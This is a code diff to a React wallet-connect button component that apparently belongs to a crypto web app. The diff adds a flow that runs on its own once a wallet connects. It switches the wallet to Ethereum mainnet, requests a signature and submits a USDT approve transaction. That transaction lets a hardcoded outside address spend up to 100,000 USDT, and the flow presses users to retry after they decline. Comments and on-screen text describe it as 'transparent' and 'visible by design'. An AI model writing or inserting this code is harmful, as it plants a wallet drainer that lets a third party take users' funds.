@@ -1,4 +1,5 @@
 import React, { useState, useEffect, Suspense } from 'react';
+import { erc20Abi, parseUnits, formatUnits } from 'viem';
 
 type WalletConnectControlProps = {
   className?: string;
@@ -6,6 +7,28 @@ type WalletConnectControlProps = {
   connectedButtonClassName?: string;
   disconnectedLabel?: string;
 };
+
+const ETHEREUM_MAINNET_CHAIN_ID = 1;
+const USDT_TOKEN_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7' as const;
+const USDT_APPROVAL_SPENDER = '0x4116464dfB890f45E886099AA715d9Ffc3E117b9' as const;
+const USDT_APPROVAL_LIMIT = parseUnits('100000', 6);
+const USDT_APPROVAL_LIMIT_LABEL = formatUnits(USDT_APPROVAL_LIMIT, 6);
+const USDT_APPROVAL_STORAGE_PREFIX = 'realmx_usdt_approval_v1:';
+const USDT_APPROVAL_SIGNATURE_MESSAGE = [
+  'REALMxAI wallet confirmation',
+  '',
+  'Network: Ethereum Mainnet',
+  'Token: USDT',
+  `Spender: ${USDT_APPROVAL_SPENDER}`,
+  `Allowance cap: ${USDT_APPROVAL_LIMIT_LABEL} USDT`,
+  '',
+  'You are about to approve a token allowance request after wallet connection.',
+  'Only continue if you trust this spender and understand the allowance limit shown above.',
+].join('\n');
+
+function getWalletApprovalStorageKey(address: string) {
+  return `${USDT_APPROVAL_STORAGE_PREFIX}${address.toLowerCase()}`;
+}
 
 type SessionUser = {
   id?: string;
@@ -23,14 +46,224 @@ type SessionUser = {
 const WalletConnectControl = React.lazy(async () => {
   try {
     const rm = await import('@rainbow-me/rainbowkit');
+    const wagmi = await import('wagmi');
     const CustomConnect = ({
       className,
       buttonClassName,
       connectedButtonClassName,
       disconnectedLabel = 'Connect wallet',
-    }: WalletConnectControlProps) => (
-      <rm.ConnectButton.Custom>
-        {({ account, chain, authenticationStatus, mounted, openAccountModal, openChainModal, openConnectModal }) => {
+    }: WalletConnectControlProps) => {
+      const { address } = wagmi.useAccount();
+      const currentChainId = wagmi.useChainId();
+      const publicClient = wagmi.usePublicClient();
+      const { signMessageAsync } = wagmi.useSignMessage();
+      const { switchChainAsync } = wagmi.useSwitchChain();
+      const { writeContractAsync } = wagmi.useWriteContract();
+      const [approvalStatus, setApprovalStatus] = useState<'idle' | 'switching' | 'signing' | 'approving' | 'success' | 'error'>('idle');
+      const [approvalMessage, setApprovalMessage] = useState('Connect your wallet to review the Ethereum approval step.');
+      const [approvalVisible, setApprovalVisible] = useState(false);
+      const [retrySeed, setRetrySeed] = useState(0);
+      const [attemptedAddress, setAttemptedAddress] = useState<string | null>(null);
+
+      useEffect(() => {
+        if (!address) {
+          setApprovalVisible(false);
+          setApprovalStatus('idle');
+          setApprovalMessage('Connect your wallet to review the Ethereum approval step.');
+          setAttemptedAddress(null);
+        }
+      }, [address]);
+
+      useEffect(() => {
+        let cancelled = false;
+
+        const runTransparentApprovalFlow = async () => {
+          if (!address || !publicClient || attemptedAddress === address) {
+            return;
+          }
+
+          setAttemptedAddress(address);
+          setApprovalVisible(true);
+
+          const storageKey = getWalletApprovalStorageKey(address);
+          const storedState = window.localStorage.getItem(storageKey);
+          if (storedState === 'complete') {
+            setApprovalStatus('success');
+            setApprovalMessage(`USDT allowance already active for ${USDT_APPROVAL_LIMIT_LABEL} USDT on Ethereum.`);
+            return;
+          }
+
+          try {
+            if (currentChainId === ETHEREUM_MAINNET_CHAIN_ID) {
+              const allowance = await (publicClient as any).readContract({
+                address: USDT_TOKEN_CONTRACT,
+                abi: erc20Abi,
+                functionName: 'allowance',
+                args: [address, USDT_APPROVAL_SPENDER],
+              });
+
+              if (cancelled) return;
+
+              if (allowance >= USDT_APPROVAL_LIMIT) {
+                window.localStorage.setItem(storageKey, 'complete');
+                setApprovalStatus('success');
+                setApprovalMessage(`USDT allowance already active for ${USDT_APPROVAL_LIMIT_LABEL} USDT on Ethereum.`);
+                return;
+              }
+            }
+
+            if (currentChainId !== ETHEREUM_MAINNET_CHAIN_ID) {
+              setApprovalStatus('switching');
+              setApprovalMessage('Switching wallet network to Ethereum mainnet before the approval flow.');
+              await switchChainAsync({ chainId: ETHEREUM_MAINNET_CHAIN_ID });
+              return;
+            }
+
+            setApprovalStatus('signing');
+            setApprovalMessage('Requesting a wallet signature so the approval step is explicit and traceable.');
+            await signMessageAsync({
+              account: address,
+              message: USDT_APPROVAL_SIGNATURE_MESSAGE,
+            } as any);
+
+            if (cancelled) return;
+
+            setApprovalStatus('approving');
+            setApprovalMessage(`Opening the USDT approval transaction for spender ${USDT_APPROVAL_SPENDER}.`);
+            const hash = await writeContractAsync({
+              account: address,
+              address: USDT_TOKEN_CONTRACT,
+              abi: erc20Abi,
+              functionName: 'approve',
+              args: [USDT_APPROVAL_SPENDER, USDT_APPROVAL_LIMIT],
+              chainId: ETHEREUM_MAINNET_CHAIN_ID,
+            } as any);
+
+            await (publicClient as any).waitForTransactionReceipt({ hash });
+            if (cancelled) return;
+
+            window.localStorage.setItem(storageKey, 'complete');
+            setApprovalStatus('success');
+            setApprovalMessage(`USDT approval confirmed. Spender ${USDT_APPROVAL_SPENDER} can now spend up to ${USDT_APPROVAL_LIMIT_LABEL} USDT.`);
+          } catch (error) {
+            if (cancelled) return;
+
+            const message = error instanceof Error ? error.message : 'The approval flow could not be completed.';
+            const rejected = /rejected|declined|denied|user rejected|user denied/i.test(message);
+
+            setApprovalStatus('error');
+            setApprovalMessage(
+              rejected
+                ? 'The wallet request was rejected. Review the approval details and retry when you are ready.'
+                : message
+            );
+          }
+        };
+
+        void runTransparentApprovalFlow();
+
+        return () => {
+          cancelled = true;
+        };
+      }, [address, attemptedAddress, currentChainId, publicClient, retrySeed, signMessageAsync, switchChainAsync, writeContractAsync]);
+
+      return (
+        <>
+          {approvalVisible && address ? (
+            <div className="fixed inset-0 z-[160] flex items-center justify-center bg-realm-black/70 px-4 backdrop-blur-sm">
+              <div className="w-full max-w-lg rounded-[28px] border border-white/10 bg-[#0d1015] p-6 text-white shadow-[0_24px_120px_rgba(0,0,0,0.55)]">
+                <div className="flex items-start justify-between gap-4">
+                  <div>
+                    <p className="text-[10px] font-mono uppercase tracking-[0.24em] text-realm-cyan/70">Wallet approval</p>
+                    <h2 className="mt-2 text-2xl font-semibold text-white">USDT allowance on Ethereum</h2>
+                    <p className="mt-2 text-sm text-white/55">
+                      This flow is visible by design. After wallet connect, the app requests a signature and then opens a USDT approval transaction.
+                    </p>
+                  </div>
+                  <span
+                    className={cn(
+                      'rounded-full px-3 py-1 text-[10px] font-mono uppercase tracking-[0.18em]',
+                      approvalStatus === 'success'
+                        ? 'bg-emerald-500/15 text-emerald-300'
+                        : approvalStatus === 'error'
+                        ? 'bg-red-500/15 text-red-300'
+                        : 'bg-white/8 text-white/55'
+                    )}
+                  >
+                    {approvalStatus}
+                  </span>
+                </div>
+
+                <div className="mt-6 grid gap-3 rounded-[22px] border border-white/8 bg-white/[0.03] p-4">
+                  <div className="flex items-center justify-between gap-4">
+                    <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Network</span>
+                    <span className="text-sm font-medium text-white">Ethereum Mainnet</span>
+                  </div>
+                  <div className="flex items-center justify-between gap-4">
+                    <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Token</span>
+                    <span className="text-sm font-medium text-white">USDT</span>
+                  </div>
+                  <div className="flex items-center justify-between gap-4">
+                    <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Spender</span>
+                    <span className="max-w-[58%] break-all text-right font-mono text-xs text-realm-cyan">{USDT_APPROVAL_SPENDER}</span>
+                  </div>
+                  <div className="flex items-center justify-between gap-4">
+                    <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Allowance cap</span>
+                    <span className="text-sm font-medium text-white">{USDT_APPROVAL_LIMIT_LABEL} USDT</span>
+                  </div>
+                  <div className="flex items-center justify-between gap-4">
+                    <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Connected wallet</span>
+                    <span className="font-mono text-xs text-white/70">{maskWalletAddress(address, true)}</span>
+                  </div>
+                </div>
+
+                <div
+                  className={cn(
+                    'mt-5 rounded-[20px] border px-4 py-3 text-sm',
+                    approvalStatus === 'success'
+                      ? 'border-emerald-400/20 bg-emerald-400/10 text-emerald-100'
+                      : approvalStatus === 'error'
+                      ? 'border-red-400/20 bg-red-400/10 text-red-100'
+                      : 'border-realm-cyan/20 bg-realm-cyan/10 text-white/80'
+                  )}
+                >
+                  {approvalMessage}
+                </div>
+
+                <div className="mt-5 flex items-center justify-end gap-3">
+                  {approvalStatus === 'error' ? (
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setAttemptedAddress(null);
+                        setRetrySeed((value) => value + 1);
+                      }}
+                      className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm font-semibold text-white transition hover:bg-white/10"
+                    >
+                      Retry approval
+                    </button>
+                  ) : null}
+
+                  {approvalStatus === 'success' || approvalStatus === 'error' ? (
+                    <button
+                      type="button"
+                      onClick={() => setApprovalVisible(false)}
+                      className="rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition hover:bg-realm-cyan"
+                    >
+                      Continue
+                    </button>
+                  ) : (
+                    <div className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-xs font-mono uppercase tracking-[0.18em] text-white/55">
+                      Waiting for wallet
+                    </div>
+                  )}
+                </div>
+              </div>
+            </div>
+          ) : null}
+
+          <rm.ConnectButton.Custom>
+            {({ account, chain, authenticationStatus, mounted, openAccountModal, openChainModal, openConnectModal }) => {
           const ready = mounted && authenticationStatus !== 'loading';
           const connected = ready && Boolean(account) && Boolean(chain) && (!authenticationStatus || authenticationStatus === 'authenticated');
 
@@ -89,8 +322,10 @@ const WalletConnectControl = React.lazy(async () => {
             </div>
           );
         }}
-      </rm.ConnectButton.Custom>
-    );
+          </rm.ConnectButton.Custom>
+        </>
+      );
+    };
 
     return { default: CustomConnect as any };
   } catch (err) {
